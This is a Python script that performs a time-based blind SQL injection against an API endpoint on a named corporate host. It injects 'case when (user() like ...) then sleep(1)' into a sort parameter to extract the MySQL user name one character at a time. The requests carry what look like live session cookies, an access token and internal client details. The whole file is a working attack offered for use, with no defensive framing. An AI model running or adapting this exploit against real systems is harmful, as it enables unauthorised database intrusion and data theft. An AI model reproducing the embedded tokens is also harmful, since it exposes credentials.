# -*- coding:utf-8 -*-

import http.client
import re
import urllib.request, urllib.parse, urllib.error


payloads = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@_.:/'
#payloads = '21'
print('Start to retrive MySQL User:')
user= ''
knowuser = 'HENANPROVINCE'
oldpayload = ''

for i in range(1,18):
    for payload in payloads:
        newpayload = oldpayload+payload
        #urls = '/api/hppd/guest/asset/list?search=%40&type=%E6%8C%87%E5%AF%BC%E4%B9%A6%252F%E5%9F%B9%E8%AE%AD%E6%95%99%E6%9D%90&field=%40&page=0&size=10&sort=case when (user() like \''+newpayload+'%\') then sleep(3) else download end,desc'
        #params = urllib.urlencode({'searchWord':'1%\')and(user()like\''+newpayload+'%\')and(\'%\'=\''})
        urls = '/api/hppd/guest/asset/list%3Fsearch%3D%40%26type%3D%E6%8C%87%E5%AF%BC%E4%B9%A6%252F%E5%9F%B9%E8%AE%AD%E6%95%99%E6%9D%90%26field%3D%40%26page%3D0%26size%3D10%26sort%3Dcase%20when%20%28user%28%29%20like%20%27'+newpayload+'%25%27%29%20then%20sleep%281%29%20else%20download%20end%2Cdesc'
        headers = {"Host": "dev.zte.com.cn",
                   "User-Agent": "Mozilla/5.0 (Windows NT 6.1; rv:43.0) Gecko/20100101 Firefox/43.0",
                   "Accept": "application/json, text/plain, */*",
                   "Accept-Language": "zh-CN",
                   "Accept-Encoding": "gzip, deflate",
                   "Referer": "http://dev.zte.com.cn/hppd/",
                   "Cookie":"ZTEDPGSSOUser=10192989; APPACCESSTOKEN=ZBPw+XJtNmzvKP4mOsjvGGlTtBrQ6P59VMALDM7QLzJEUEkhT1jfqGGAR5GMtFL1fiZz+lH4d6e4%0aIVF5G9rJKA==; ZTEDPGSSOCookie=ZBPw+XJtNmzvKP4mOsjvGGlTtBrQ6P59VMALDM7QLzJEUEkhT1jfqGGAR5GMtFL1fiZz+lH4d6e4%0aIVF5G9rJKA==; ZTEDPGSSOLanguage=zh_CN; ZTEDPGSSOVersionType=1; udsVersion=V3.5.1build18; udsClientIp=10.18.64.13; clientSerialNo=44-87-FC-6F-CF-6B; JSESSIONID=F4897D7AFAA5DFBAA995A9ADC8743660",
                   "Connection":"keep-alive",
                   "Content-Type":"application/json"}
        conn = http.client.HTTPConnection('dev.zte.com.cn', 80, timeout=10)
        #conn.request(method='GET',url=urls,headers=headers)
        #result = conn.getresponse().status
        #conn.close()
        try:
            conn.request(method='GET',url=urls,headers=headers)
            result = conn.getresponse().status
            if result != 400:
                print(result)
                oldpayload = oldpayload+payload
                user = oldpayload
                print('\n\n[in progress]', user, end=' ')
                break
            else:
                pass
            conn.close()
        except Exception as e:
            print('asdad')
            oldpayload = oldpayload+payload
            user = oldpayload
            print('\n\n[in progress]', user, end=' ')
            break
        #if conn.getresponse().status:
            #oldpayload = oldpayload+payload
            #conn.close()
            #user = oldpayload
            #print '\n\n[in progress]', user,
            #break
print('\n\n[Done] MySQL User is %s' % user)



